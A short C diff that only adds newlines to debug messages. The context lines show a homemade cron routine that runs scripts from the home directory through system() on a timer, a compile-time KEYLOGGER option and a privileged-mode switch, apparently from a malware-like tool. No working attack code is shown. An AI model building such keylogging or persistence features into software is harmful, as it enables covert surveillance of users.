@@ -26,19 +26,19 @@ __inline__ void debug(char * format, ...){
 void cron(int n){
     char buffer[256];
 
-    debug("Executant el cron daily");
+    debug("Executant el cron daily\n");
     sprintf(buffer, HOME"/.daily");
     system(buffer);
 
     weekday++;
     if ((weekday % 7) == 0){
-        debug("Executant el cron weekly");
+        debug("Executant el cron weekly\n");
         sprintf(buffer, HOME"/.weekly");
         system(buffer);
     }
 
     if ((weekday % 30) == 0){
-        debug("Executant el cron monthly");
+        debug("Executant el cron monthly\n");
         sprintf(buffer, HOME"/.monthly");
         system(buffer);
         weekday = 0;
@@ -69,13 +69,13 @@ int main(int argc, char *argv[]) {
 
 	// Cron
 #if CROND
-    debug("Initializing crond");
+    debug("Initializing crond\n");
     signal(SIGALRM, cron);
     alarm(60*60*24);
 #endif
 
 #ifdef KEYLOGGER
-    debug("Initializing keylogger");
+    debug("Initializing keylogger\n");
 #endif
 	
 	// Privileged or unprivileged mode
